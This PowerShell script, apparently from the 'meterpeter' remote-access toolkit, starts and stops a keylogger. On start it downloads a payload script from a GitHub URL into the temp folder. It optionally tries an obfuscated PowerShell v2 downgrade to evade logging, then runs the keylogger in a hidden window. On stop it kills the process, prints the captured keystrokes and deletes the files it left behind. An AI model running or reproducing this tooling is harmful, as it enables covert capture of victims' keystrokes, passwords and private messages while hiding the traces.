[CmdletBinding(PositionalBinding=$false)] param(
   [string]$Action="start",
   [string]$UsePS2="false"
)


#Global variable declarations
$ErrorActionPreference = "SilentlyContinue"


IF($Action -ieq "start")
{

   If(-not(Test-Path -Path "$Env:TMP\mscore.ps1"))
   {
      #Download cmdlet from my github repository
      iwr -Uri "https://raw.githubusercontent.com/r00t-3xp10it/meterpeter/master/mimiRatz/mscore.ps1" -OutFile "$Env:TMP\mscore.ps1"|Unblock-File
   }

   If($UsePS2 -ieq "true")
   {
      $TryThisInsted = "#pow#e@rsh#e@ll -@ve#r@sio@n @2# -@C# ech@o ps2v@er#si@onfo@un#d|O@ut-@File# $Env:TMP\downgradeatt.log -Fo@rc@e" -replace '(@|#)',''
      "$TryThisInsted"|&('SEX' -replace 'S','i')
      $TestDowngradeAtt = Get-Content -Path "$Env:TMP\downgradeatt.log"|Select-String "ps2versionfound"
      Remove-Item -Path "$Env:TMP\downgradeatt.log" -Force
      If($TestDowngradeAtt -iMatch '^(ps2versionfound)$')
      {
         $rrr = "-version"
         #Use powershell $rrr 2 to execute keylogger
         $cmdlineToExec = "powershell $rrr 2 -C Import-Module -Name `$Env:TMP\mscore.ps1 -Force"
      }
      Else
      {
         #Defaul keylogger execution function
         $cmdlineToExec = "Import-Module -Name `$Env:TMP\mscore.ps1 -Force"         
      }
   }
   Else
   {
      #Defaul keylogger execution function
      $cmdlineToExec = "Import-Module -Name `$Env:TMP\mscore.ps1 -Force"   
   }

   If(Test-Path -Path "$Env:TMP\mscore.ps1")
   {
      #Start keylogger process in background
      Start-Process -WindowStyle Hidden powershell -ArgumentList "$cmdlineToExec"
      If($?)
      {
         Start-Sleep -Milliseconds 600 #Give some time for log creation
         $PPID = (Get-Content "$Env:TMP\pid.log" | Where-Object { $_ -ne '' })
         write-host "`n * Key-logger process started with ID: $PPID" -ForegroundColor Green
      }
      Else
      {
         write-host "`n x Error: fail to start Key-logger background process .." -ForegroundColor Red -BackgroundColor Black
      }
   }
   Else
   {
      write-host "`n x Error: '$Env:TMP\mscore.ps1' missing.." -ForegroundColor Red -BackgroundColor Black
   }
}


IF($Action -ieq "stop")
{

   If(Test-Path -Path "$Env:TMP\pid.log")
   {
      #Get key-logger PPID from logfile
      $PPID = Get-Content "$Env:TMP\pid.log" | Where-Object { $_ -ne '' }
      #Stop key-logger process by is PPID
      Stop-Process -Id $PPID -Force
      If($?)
      {
         write-host "`n* Key-logger process '$PPID' stoped." -ForegroundColor Green
      }
      Else
      {
         write-host "`nx Error: fail to stop Key-logger process id: '$PPID'" -ForegroundColor Red -BackgroundColor Black
      }
   }
   Else
   {
      write-host "`nx Error: fail to retrieve key-logger process ID" -ForegroundColor Red -BackgroundColor Black
   }


   #Get the KeyStrokes
   write-host "`nKeylogger Key-strokes Capture" -ForegroundColor Yellow
   write-host "----------------------------"
   If(Test-Path -Path "$Env:TMP\void.log")
   {
      Get-Content -Path "$Env:TMP\void.log"
   }
   Else
   {
      write-host "x Error: '$Env:TMP\void.log' missing" -ForegroundColor Red -BackgroundColor Black   
   }

   #Clean all artifacts left behind
   Remove-Item -Path "$Env:TMP\mscore.ps1" -Force
   Remove-Item -Path "$Env:TMP\void.log" -Force
   Remove-Item -Path "$Env:TMP\pid.log" -Force
}